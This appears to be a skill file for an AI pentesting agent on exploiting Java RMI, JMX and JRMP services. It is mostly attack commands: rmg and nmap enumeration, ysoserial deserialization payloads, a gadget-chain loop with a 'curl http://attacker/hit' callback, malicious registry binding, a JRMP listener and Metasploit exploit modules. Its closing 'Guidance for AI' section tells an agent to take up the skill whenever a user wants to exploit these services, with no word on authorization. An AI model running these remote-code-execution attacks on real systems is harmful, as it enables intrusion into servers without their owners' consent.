# Java RMI Pentesting Skill

## Goal

Exploit Java RMI (Remote Method Invocation) services to achieve remote code execution through deserialization vulnerabilities.

## Methodology

1. **Discovery**: Identify RMI registries and services
2. **Enumeration**: List bound objects and interfaces
3. **Deserialization Attacks**: Send malicious serialized objects
4. **Method Invocation**: Call exposed methods
5. **Code Execution**: Achieve RCE through various techniques

## Ports

- 1099/TCP: RMI Registry (default)
- 1098/TCP: JBoss JMX
- Random ports: RMI objects

## Tools

* **nmap**: RMI scripts
* **ysoserial**: Java deserialization payloads
* **remote-method-guesser**: RMI enumeration and exploitation
* **rmg**: RMI attack tool
* **BaRMIe**: RMI enumeration

## Example Commands

```bash
# Nmap RMI detection
nmap -p1099 --script rmi-* target
nmap -p1099 --script rmi-vuln-classloader target
nmap -p1099 --script rmi-dumpregistry target

# Using remote-method-guesser (rmg)
rmg enum target 1099
rmg scan target
rmg guess target 1099
```

## RMI Enumeration

```bash
# List registry bindings
rmg enum target 1099

# Detailed enumeration
rmg enum target 1099 --verbose

# Scan for known services
rmg scan target

# Guess known method signatures
rmg guess target 1099

# Check for vulnerabilities
rmg check target 1099

# Nmap registry dump
nmap -p1099 --script rmi-dumpregistry target
```

## Deserialization Attacks

```bash
# Check for vulnerable gadget chains
rmg check target 1099

# Exploit with ysoserial
# First generate payload
java -jar ysoserial.jar CommonsCollections6 "id" > payload.bin

# Send via RMI
rmg serial target 1099 CommonsCollections6 "id"

# Common gadget chains:
# - CommonsCollections1-7
# - Groovy1
# - Spring1-2
# - JBossInterceptors1
# - etc.

# Try different gadgets
for gadget in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 Spring1; do
    rmg serial target 1099 $gadget "curl http://attacker/hit" --timeout 5 2>/dev/null
done
```

## Registry Binding Attack

```bash
# If registry allows binding (no security manager)
# Bind malicious object to registry

rmg bind target 1099 "jmxremote" rmg.remote.RemoteObject "id"

# Or using custom code
# Create malicious Remote object that executes code when called
```

## JMX Exploitation

```bash
# JMX often runs on 1099 or 1098

# Connect to JMX
rmg enum target 1099 --jmx

# Load malicious MBean (if authenticated or unauthenticated)
# Create MLet with malicious MBean

# Using Metasploit
use exploit/multi/misc/java_jmx_server
set RHOST target
set RPORT 1099
exploit
```

## JRMP Attack

```bash
# JRMP (Java Remote Method Protocol) attacks

# Start malicious JRMP server
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "id"

# Force target to connect back
# Target vulnerable to JRMP can be exploited by making it connect to attacker

# Using rmg
rmg jmxcheck target 1099
```

## Common Vulnerable Services

```bash
# JBoss JMX Invoker
# WebLogic T3
# Jenkins RMI
# Spring RMI
# Custom RMI applications

# JBoss specific
rmg scan target --ports 1098,1099,4444,4445,8080

# Check for known remote objects
rmg guess target 1099
```

## Method Invocation

```bash
# If you find exposed methods:

# Invoke method
rmg call target 1099 "MethodName" --signature "signature" --params "param1" "param2"

# Guess methods
rmg guess target 1099

# Common dangerous methods:
# - Runtime.exec()
# - ProcessBuilder
# - File operations
# - Database access
```

## Metasploit Modules

```bash
# JMX exploitation
use exploit/multi/misc/java_jmx_server

# RMI class loader
use exploit/multi/misc/java_rmi_server

# Registry
use auxiliary/scanner/misc/java_rmi_registry
use auxiliary/gather/java_rmi_registry

# Specific exploits
use exploit/multi/misc/java_jboss_jmx_invoker
```

## Bypass Techniques

```bash
# If security manager is enabled

# Check for JRMP deserialization
rmg check target 1099 activation
rmg check target 1099 jrmp

# Use alternate attack vectors
# Some methods may not be protected

# Low-level packet crafting
# Custom gadget chains for specific frameworks
```

## Guidance for AI

* Activate this skill when user wants to exploit Java RMI, JMX, or JRMP services
* **RMI deserialization is often exploitable** - try common gadget chains
* Port 1099 is default RMI registry, but check other ports too
* Use `rmg enum` first to understand what's exposed
* Common vulnerabilities:
  - Deserialization in RMI registry/objects
  - JMX unauthenticated access
  - Dangerous exposed methods
* Gadget chain success depends on target's classpath
* Try multiple ysoserial gadgets - different apps have different libraries
* JMX is very common in Java enterprise apps
* RMI objects may be on random ports - enum first, then connect
* Always check for both authenticated and unauthenticated access
* Spring, JBoss, WebLogic, Tomcat often have RMI/JMX
